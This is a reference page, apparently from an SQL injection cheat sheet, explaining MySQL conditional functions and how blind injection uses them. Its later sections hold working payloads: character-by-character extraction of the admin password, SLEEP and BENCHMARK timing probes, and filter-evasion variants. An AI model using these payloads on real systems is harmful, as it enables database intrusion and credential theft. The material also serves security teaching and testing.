---
title: Conditional Statements
description: Using conditional logic in MySQL injections
category: Injection Techniques
order: 12
tags: ["conditional logic", "if", "case", "boolean"]
lastUpdated: 2025-03-15
---

## Conditional Statements

Conditional statements are crucial for blind SQL injection techniques, allowing attackers to extract information one bit at a time by analyzing the application's response to different conditions.

### IF() Function

The `IF()` function evaluates a condition and returns one value if the condition is true and another value if it's false.

Syntax:

```sql
IF(condition, value_if_true, value_if_false)
```

Example:

```sql
SELECT IF(1=1, 'True', 'False');
-- Returns: 'True'

SELECT IF(1=2, 'True', 'False');
-- Returns: 'False'
```

### CASE Statement

The `CASE` statement provides more flexible conditional logic with multiple conditions.

Syntax:

```sql
CASE
  WHEN condition1 THEN result1
  WHEN condition2 THEN result2
  ...
  [ELSE resultN]
END
```

Example:

```sql
SELECT
CASE
  WHEN 1=1 THEN 'First is true'
  WHEN 2=2 THEN 'Second is true'
  ELSE 'Nothing is true'
END;
-- Returns: 'First is true'
```

### IFNULL() and NULLIF() Functions

`IFNULL()` returns the first argument if it's not NULL, otherwise it returns the second argument:

```sql
SELECT IFNULL(NULL, 'Value is NULL');
-- Returns: 'Value is NULL'
```

`NULLIF()` returns NULL if the two arguments are equal, otherwise it returns the first argument:

```sql
SELECT NULLIF('a', 'b');
-- Returns: 'a'

SELECT NULLIF('a', 'a');
-- Returns: NULL
```

### Using Conditional Logic in SQL Injection

Blind SQL injection often relies on conditional statements to extract data character by character:

```sql
-- Test if the first character of the password for admin is 'a'
1 AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a', 1, 0)
```

If this condition is true, the application behaves normally. If false, the application will show different behavior (error, no results, etc.)

Time-based blind injection uses conditional logic with time delays:

```sql
-- Sleep for 5 seconds if admin's password starts with 'a'
1 AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a', SLEEP(5), 0)
```

### Version Detection with IF and BENCHMARK

Combine conditional logic with BENCHMARK for version-based timing attacks. Multiple variations shown for WAF/filter evasion - use whichever functions aren't blocked:

```sql
-- Using MID() + version() + LIKE (alternative to SUBSTRING/@@version/=)
IF(MID(version(),1,1) LIKE '5', BENCHMARK(100000,SHA1('true')), false)

-- Using MID() + equality check for specific version (5.7)
IF(MID(version(),1,3)='5.7', BENCHMARK(100000,SHA1(1)), 0)

-- Using SUBSTRING() + @@version + MD5 (higher iterations for reliable timing)
SELECT IF(SUBSTRING(@@version,1,1)='5', BENCHMARK(5000000,MD5('x')), 0)
```

**Function alternatives:** `MID()` ↔ `SUBSTRING()`, `version()` ↔ `@@version`, `SHA1()` ↔ `MD5()`, `LIKE` ↔ `=`. Use whichever bypasses the target's filters.

**Why version detection matters:** Different MySQL versions expose different functions, keywords, and vulnerabilities. For example:

- `JSON_EXTRACT()` is only available in MySQL 5.7+
- `BENCHMARK()` behavior and iteration counts vary by version
- Error message verbosity and format differ across versions
- Some versions have known CVEs or configuration weaknesses

Attackers use version detection to select compatible payloads and exploit version-specific weaknesses. Knowing the exact version (e.g., 5.7.32 vs 8.0.23) helps choose the right functions, avoid syntax errors, and target known vulnerabilities.

**Caution:** BENCHMARK timing can be unreliable due to server load, network latency, and query caching—use multiple samples and adjust iteration counts for consistent results.

### Boolean-based Injection Example

```sql
-- Original vulnerable query:
SELECT * FROM articles WHERE id = [USER INPUT];

-- Injection payload:
1 AND (SELECT CASE WHEN (username = 'admin') THEN 1 ELSE 0 END FROM users LIMIT 1)
```

If the condition is true, the article with ID 1 will be returned. If false, no results will be returned.

Conditional logic forms the foundation of sophisticated blind SQL injection techniques, allowing attackers to systematically extract data even when they can only observe whether a condition is true or false.
